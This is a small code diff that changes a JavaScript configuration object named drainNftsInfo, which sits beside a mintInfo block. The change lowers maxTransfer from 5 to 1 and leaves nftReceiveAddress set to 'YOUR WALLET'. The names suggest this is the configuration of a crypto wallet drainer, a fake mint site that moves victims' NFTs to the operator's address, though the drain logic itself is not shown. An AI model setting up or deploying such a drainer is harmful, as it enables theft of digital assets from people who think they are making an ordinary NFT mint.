@@ -47,7 +47,7 @@ const mintInfo = {
 const drainNftsInfo = {
     active: true,
     minValue: 0.2,
-    maxTransfer: 5,
+    maxTransfer: 1,
     nftReceiveAddress: "YOUR WALLET",
 }
 
